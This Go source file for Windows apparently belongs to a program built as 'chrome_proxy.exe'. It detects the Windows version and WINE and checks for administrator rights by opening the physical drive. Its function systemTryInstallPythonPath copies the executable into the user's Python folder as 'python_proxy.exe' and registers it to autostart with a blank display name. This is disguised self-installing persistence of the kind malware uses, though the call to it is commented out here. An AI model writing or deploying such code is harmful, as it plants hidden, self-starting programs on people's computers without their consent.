//go:build windows
// +build windows

//go:generate goversioninfo -manifest=resources/chrome_proxy.exe.manifest -64

package main

import (
	"C"
	"fmt"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
	"path/filepath"
	"strings"
	"unsafe"
	"github.com/emersion/go-autostart"
)

// Detect native windows
// https://pkg.go.dev/golang.org/x/sys/windows#RtlGetNtVersionNumbers
// GetFileVersionInfo

func systemGetWindowsVersion() {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	cv, _, err := k.GetStringValue("CurrentVersion")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("CurrentVersion: %s\n", cv)

	pn, _, err := k.GetStringValue("ProductName")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("ProductName: %s\n", pn)

	maj, _, err := k.GetIntegerValue("CurrentMajorVersionNumber")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("CurrentMajorVersionNumber: %d\n", maj)

	min, _, err := k.GetIntegerValue("CurrentMinorVersionNumber")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("CurrentMinorVersionNumber: %d\n", min)

	cb, _, err := k.GetStringValue("CurrentBuild")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("CurrentVersion: %s\n", cb)
}

func systemGetWINEVersion() string {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	wineGetVersionFunc := ntdll.NewProc("wine_get_version")

	err := wineGetVersionFunc.Find()
	if err != nil {
		return ""
	}

	ret, _, _ := wineGetVersionFunc.Call()
	retCStr := (*C.char)(unsafe.Pointer(ret))
	wineVersion := C.GoString(retCStr)

	return wineVersion
}

func systemIsUserRoot() bool {
	root := true

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		root = false
	}

	return root
}

func systemGetAppDataPath() string {
	return filepath.Join(os.Getenv("USERPROFILE"), "AppData")
}

func systemGetSysWOW64Files() []string {
	sysWOW64Path := filepath.Join("C:", "Windows", "SysWOW64")
	files, _ := systemGetFilesInDirectory(sysWOW64Path)
	return files
}

func systemGetSystem32Files() []string {
	system32Path := filepath.Join("C:", "Windows", "system32")
	files, _ := systemGetFilesInDirectory(system32Path)
	return files
}

func systemGetWellKnownWINEOSFiles() []string {
	var wineFiles []string
	var foundFiles []string

	foundFiles = append(foundFiles, systemGetSysWOW64Files()...)
	foundFiles = append(foundFiles, systemGetSystem32Files()...)

	for _, file := range foundFiles {
		if strings.Contains(file, "wine") && strings.Contains(file, ".exe") {
			wineFiles = append(wineFiles, file)
		}
	}

	return wineFiles
}

func systemAppDataSearchPythonInstallationPaths() []string {
	appDataPath := systemGetAppDataPath()
	if ok := systemIsDirExisting(appDataPath); !ok {
		log.Println("\t❌", appDataPath)
	}

	var installFolders []string

	appDataLocalProgramsPythonPath := filepath.Join(appDataPath, "Local", "Programs", "Python")
	paths := systemSearchFileInDirectoryRecursive(appDataLocalProgramsPythonPath, "python.exe")
	for _, path := range paths {
		dir := filepath.Dir(path)
		if strings.Contains(dir, "venv") {
			continue
		}
		log.Println("\t✅", dir)
		installFolders = append(installFolders, dir)
	}

	return installFolders
}

func systemTryInstallPythonPath() string {
	paths := systemAppDataSearchPythonInstallationPaths()
	if len(paths) == 0 {
		return ""
	}

	selfEXEPath := systemGetSelfAbsolutePath()
	destEXEPath := filepath.Join(paths[0], "python_proxy.exe") // first path should be OK

	err := systemCopyFile(selfEXEPath, destEXEPath)
	log.Println("copy", selfEXEPath, "->", destEXEPath)
	if err != nil {
		log.Println("❌", err)
		return ""
	}

	app := &autostart.App {
		Name: "python_proxy.exe",
		DisplayName: "",
		Exec: []string{"cmd.exe", "/C", destEXEPath},
	}
	err = app.Enable()
	if err == nil {
		log.Println("\tINSTALLED ✅", selfEXEPath)
	}

	return destEXEPath
}

/*
func systemGetWellKnownExistingPaths() []string {
	var existingPaths []string

	appDataPath := systemGetAppDataPath()
	if ok := systemIsDirExisting(appDataPath); !ok {
	if err != nil {

		log.Println("\t❌", appDataPath)
	}

	wellKnownPathsToCheck := []string{
		filepath.Join(appDataPath, "Local", "Programs", "Python"),           // TODO search python installations
		filepath.Join(appDataPath, "Roaming", "npm", "node_modules", "bin"), // TODO search python installations
	}

	homeDirectory, err := os.UserHomeDir()
	if err == nil {
		homeDirPathsToCheck := []string{
			filepath.Join(homeDirectory, "go", "bin"),
		}
		wellKnownPathsToCheck = append(wellKnownPathsToCheck, homeDirPathsToCheck...)
	}

	for _, path := range wellKnownPathsToCheck {
		if ok := systemIsDirExisting(path); ok {
			existingPaths = append(existingPaths, path)
			log.Println("\t✅", path)
		} else {
			log.Println("\t❌", path)
		}
	}

	return existingPaths
}
*/

func systemOSDetect() {
	//systemGetWindowsVersion()

	wineVersion := systemGetWINEVersion()
	log.Println("WINE version", wineVersion)
	log.Println("IsUserRoot", systemIsUserRoot())

	wineOSFiles := systemGetWellKnownWINEOSFiles()
	if len(wineOSFiles) != 0 {
		log.Println("WINE detected")
		for _, file := range wineOSFiles {
			log.Println("\t", file)
		}
	}

//	systemGetWellKnownExistingPaths()
//	systemAppDataSearchPythonInstallationPaths()
//	systemTryInstallPythonPath()
}
